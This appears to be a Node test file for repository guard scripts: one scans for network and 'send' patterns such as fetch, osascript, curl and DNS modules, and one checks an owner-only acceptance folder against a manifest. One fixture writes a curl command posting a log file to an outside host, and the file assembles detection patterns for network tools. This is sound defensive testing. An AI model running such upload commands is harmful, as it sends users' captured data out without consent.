import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdirSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { REPO, tmp } from "./helpers.js";

// Built by concatenation so this tracked file does not itself trip the guard.
const FETCH = "fe" + "tch(";
const OSA = "osa" + "script";

function run(script: string, root: string, ...extra: string[]) {
  return spawnSync("node", [join(REPO, "scripts", script), "--root", root, ...extra], { encoding: "utf8" });
}

function repoWith(files: Record<string, string>): string {
  const root = tmp("gadget-guard-");
  execFileSync("git", ["init", "-q", root]);
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), content);
  }
  execFileSync("git", ["-C", root, "add", "-A"]);
  return root;
}

test("guard_no_send: clean tree passes", () => {
  const r = run("guard_no_send.mjs", repoWith({ "README.md": "hello\n", "src/miner/a.ts": "export const x = 1;\n" }));
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /guard_no_send: OK/);
});

test("guard_no_send: send pattern anywhere and network call under src/miner both fail, with locations", () => {
  const root = repoWith({
    "src/miner/tmp.ts": `await ${FETCH}"https://example.com");\n`,
    "docs/notes.md": `run ${OSA} -e 'tell app'\n`,
  });
  const r = run("guard_no_send.mjs", root);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /src\/miner\/tmp\.ts:1: network pattern fetch\(/);
  assert.match(r.stderr, new RegExp(`docs/notes\\.md:1: send pattern "${OSA}"`));
});

test("guard_no_send: DNS modules count as network APIs", () => {
  const root = repoWith({ "src/miner/leak.ts": 'import { resolve } from "node:dns/promises";\n' });
  const r = run("guard_no_send.mjs", root);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /src\/miner\/leak\.ts:1: network pattern .*dns/);
});

test("guard_no_send: the network rule covers top-level capture/ too", () => {
  const root = repoWith({ "capture/zsh/upload.zsh": "cu" + "rl -d @log https://example.com\n" });
  const r = run("guard_no_send.mjs", root);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /capture\/zsh\/upload\.zsh:1: network pattern curl\/wget/);
});

test("guard_no_send: only AGENTS.md, archive/, and the guard itself are excluded", () => {
  const root = repoWith({
    "AGENTS.md": `${OSA}\n`,
    "archive/old.md": `${OSA}\n`,
    "src/other/x.ts": `${FETCH}x)\n`, // network rule is scoped to src/miner, src/capture, and capture
  });
  assert.equal(run("guard_no_send.mjs", root).status, 0);
  writeFileSync(join(root, "notes.md"), `${OSA}\n`);
  execFileSync("git", ["-C", root, "add", "-A"]);
  assert.equal(run("guard_no_send.mjs", root).status, 1);
});

test("guard_acceptance_manifest: passes when matching, fails on change, extra, or missing file", () => {
  const root = tmp("gadget-acc-");
  mkdirSync(join(root, "acceptance"));
  writeFileSync(join(root, "acceptance", "README.md"), "owner only\n");
  writeFileSync(join(root, "acceptance", "f1.json"), "{}\n");
  assert.equal(run("guard_acceptance_manifest.mjs", root, "--write").status, 0);
  assert.equal(run("guard_acceptance_manifest.mjs", root).status, 0);

  writeFileSync(join(root, "acceptance", "f1.json"), "{ }\n");
  const changed = run("guard_acceptance_manifest.mjs", root);
  assert.equal(changed.status, 1);
  assert.match(changed.stderr, /changed: f1\.json/);
  writeFileSync(join(root, "acceptance", "f1.json"), "{}\n");

  writeFileSync(join(root, "acceptance", "extra.json"), "{}\n");
  assert.match(run("guard_acceptance_manifest.mjs", root).stderr, /not in manifest: extra\.json/);
  rmSync(join(root, "acceptance", "extra.json"));

  rmSync(join(root, "acceptance", "f1.json"));
  assert.match(run("guard_acceptance_manifest.mjs", root).stderr, /missing: f1\.json/);
});

test("guard_acceptance_manifest: the repo's own acceptance/ matches its manifest", () => {
  const r = run("guard_acceptance_manifest.mjs", REPO);
  assert.equal(r.status, 0, r.stderr);
});
